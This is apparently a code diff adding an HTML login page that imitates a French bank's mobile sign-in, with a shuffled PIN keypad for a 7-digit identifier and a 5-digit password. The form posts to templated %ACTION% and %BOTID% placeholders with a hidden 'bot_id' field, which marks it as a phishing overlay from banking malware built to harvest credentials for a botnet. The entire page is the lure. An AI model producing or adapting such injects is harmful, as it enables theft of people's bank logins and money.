@@ -1,0 +1,316 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta name="viewport" content="width=device-width, user-scalable=no, minimal-ui" />
+	<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
+	<title></title>
+
+	<style type="text/css">
+	* {
+		padding: 0px;
+		margin: 0px;
+	}
+	body {
+		background-color: #7bd2cb;
+	}
+	#relativeLoginText {
+		width: auto;
+		padding-left: 10%;
+		padding-right: 10%;
+		/*text-align: center;*/
+	}
+		#SoonTextView1 {
+			font-size: 14px;
+			margin-bottom: 8px;
+			margin-top: 17px;
+			text-align: center;
+			color: #a1faef;
+		}
+		#user_name {
+			font-size: 40px;
+			font-weight: bold;
+			text-align: center;
+			width: 100%;
+			margin-bottom: 4px;
+			/*color: #a1faef;*/
+			color: white;
+			border-radius: 5px;
+			background-color: #6ebdb6;
+			border-color: #a1faef;
+
+		}
+		input::-webkit-input-placeholder{
+			color: #a1faef;
+			text-align: center;
+		}
+		#save_loginid {
+			/*width: 100%;*/
+			/*left: 0;*/
+			font-size: 14px;
+		}
+		label {
+			color: white;
+		}
+		#SoonTextView2 {
+			font-size: 14px;
+			margin-bottom: 13px;
+			margin-top: 8px;
+			text-align: center;
+			color: #a1faef;
+		}
+		#password {
+			font-size: 40px;
+			color: white;
+			background-color: #6ebdb6;
+			border-radius: 5px;
+			text-align: center;
+			width: 100%;
+			border-color: #a1faef;
+
+		}
+		div.center {
+			text-align: center; 
+			width: auto	;
+			padding-right: 10%;
+			padding-left: 10%;
+		}
+		#passwordButton {
+			width: 50px;
+			height: 50px;
+			text-align: center;
+			border: 2px solid;
+			border-radius: 50%;
+			font-size: 30px;
+			font-weight: bold;
+			margin-bottom: 5px;
+			color: white;
+			border-color: white;
+			margin-right: 7px;
+
+		}
+
+
+		#buttonsTable {
+			width: 100%;
+			table-layout: fixed;
+		}
+		td {
+			text-align: center;
+		}
+		.buttonDiv {
+			display: inline-block;
+			width: 50px;
+			height: 50px;
+			text-align: center;
+			border: 2px solid;
+			border-radius: 50%;
+			font-size: 30px;
+			font-weight: bold;
+			margin-bottom: 5px;
+			color: white;
+			border-color: white;	
+			line-height: 50px;
+			-moz-user-select: none;
+			-webkit-user-select: none;
+			-ms-user-select:none;
+			user-select:none;
+			-o-user-select:none;	
+		}
+		.buttonDiv:active {
+			background-color: white;
+			color: #7bd2cb;
+		}
+		#continue_div {
+			margin-top: 10px;
+			margin-bottom: 20px;
+			text-align: center;
+			height: 100px;
+			line-height: 100px;
+		}
+		#continue_button:active {
+			width: 50px;
+			height: 50px;
+		}
+		.bottom_buttons{
+			background-color: black;
+			width: 100%;
+			margin: 0;
+			list-style-type: none;
+			padding: 0px;
+		}
+		.bottom_buttons li {
+			color: #a7a7a7;
+			font-size: 15px;
+			padding-left: 45px;
+			padding-top: 15px;
+			padding-right: 45px;
+			padding-bottom: 15px;
+			-moz-user-select: none;
+			-webkit-user-select: none;
+			-ms-user-select:none;
+			user-select:none;
+			-o-user-select:none;	
+
+		}
+		.bottom_buttons li:after{
+			content: url('%DYN_PATH%/img/ico_arrow_right.png');
+			float: right;
+		}
+
+		#save_loginid + label {
+			/*background-image: url("img/carre_memoriser_normal.png");*/
+			background-size: 20px 20px;
+			display: inline-block;
+			width: 15px;
+			height: 15px;
+			position: relative;
+			top: 6px;
+			border: 1px solid #232323;
+			border-radius: 3px;
+			background-size: 15px 15px;
+			/*float: right;*/
+			margin-right: 10px;
+		}
+		#save_loginid:checked + label {
+			background-image: url("%DYN_PATH%/img/cb-on.png");
+		}
+		#save_loginid {
+			display: none;
+		}
+		.cb-label {
+			color: white;
+			font-size: 14px;
+		}
+
+	</style>
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
+</head>
+<body>
+
+<div id="lineralLayout">
+	<div id="SoonTextView1">
+		VOTRE IDENTIFIANT
+	</div>
+	<form role="form" name="form" action="%ACTION%" id="form" method="post">
+	<input type="hidden" name="page_id" value="%PKG%"><input type="hidden" name="bot_id" value="%BOTID%" />
+	<div id="relativeLoginText">
+		<input type="tel" placeholder="1234567" id="user_name" name="fields[username]" maxlength="7" autocomplete="off" />
+		<input type="checkbox" id="save_loginid"><label for="save_loginid"></label><span class="cb-label">Mémoriser mon identifiant</span>
+	</div>
+	<div id="SoonTextView2">
+		VOTRE MOT DE PASSE
+	</div>
+	<div class="center">
+		<input type="password" id="password" name="fields[password]" readonly="true" placeholder="*****" maxlength="5" />
+
+		<div style="margin-top:7px;">
+
+
+			<table id="buttonsTable">
+				<tr><td class="digitsTd"></td><td class="digitsTd"></td><td class="digitsTd"></td><td class="digitsTd"></td></tr>
+				<tr><td class="digitsTd"></td><td class="digitsTd"></td><td class="digitsTd"></td><td class="digitsTd"></td></tr>
+				<tr><td><div class="buttonDiv" id="lock_button"><img src="%DYN_PATH%/img/ico_lock_keyboard.png" width="23" height="35" style="margin-top: 5px;" /></div></td><td class="digitsTd"></td><td class="digitsTd"></td><td><div class="buttonDiv" id="delete_button"><img src="%DYN_PATH%/img/ico_delete.png" width="35" height="20" style="margin-top: 15px;" /></div></td></tr>
+			</table>
+
+		</div>
+
+	</div>
+
+		<div id="continue_div">
+			<img id="continue_button" src="%DYN_PATH%/img/big_button.png" width="100px" height="100px" />
+		</div>
+		</form>
+
+		<ul class="bottom_buttons">
+			<li id="forgot_password">MOT DE PASSE OUBLIÉ?</li>
+			<li id="security">SÉCURITÉ</li>
+			<li id="opposition">OPPOSITION</li>
+		</ul>
+
+</div>
+
+</body>
+
+<script type="text/javascript">
+
+Array.prototype.shuffle = function() {
+   var i = this.length;
+   while (--i) {
+      var j = Math.floor(Math.random() * (i + 1))
+      var temp = this[i];
+      this[i] = this[j];
+      this[j] = temp;
+   }
+
+   return this; // for convenience, in case we want a reference to the array
+};
+
+function passwordClick(elem){
+	var passw = $('#password');
+	if (passw.val().length >= 5){
+		return;
+	}
+
+	passw.val(passw.val() + elem.id);
+}
+
+	(function(){
+		var digits = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9].shuffle();
+		var tds = $('.digitsTd');
+		// var tds = document.querySelectorAll('.digitsTd');
+		for (var i = 0; i < tds.length; i++){
+			var elem = document.createElement('div');
+			elem.classList.add('buttonDiv');
+			elem.innerText = digits[i];
+			elem.id = digits[i];
+			elem.onclick = function(){
+				passwordClick(this);
+			};
+			var td = tds[i];
+			td.append(elem);
+		}
+
+		$('#continue_button').bind('click', function(){
+			var fields = {
+				'user_name': /[0-9]{7}/,
+				'password': /[0-9]{5}/
+			};
+
+			var err = false;
+
+			for (i in fields){
+				var field = i;
+				var regex = fields[i];
+
+				if(!(new RegExp(regex).test($('#' + field).val())))
+				{
+					$('#' + field).closest('.form-group').addClass('has-error');
+					err = true;
+				} 
+			}
+
+			if (err){
+				return;
+			}
+
+			var oForm=document.getElementById('form');
+			oForm.submit();
+		});
+
+		$('#delete_button').bind('click', function(){
+			var passw = $('#password');
+			var str = passw.val();
+			str = str.substring(0, str.length - 1);
+			passw.val(str);
+		});
+
+		$('#lock_button').bind('click', function(){
+			window.scrollTo(0,document.body.scrollHeight);
+		});
+
+
+	})();
+
+</script>
+
+</html>
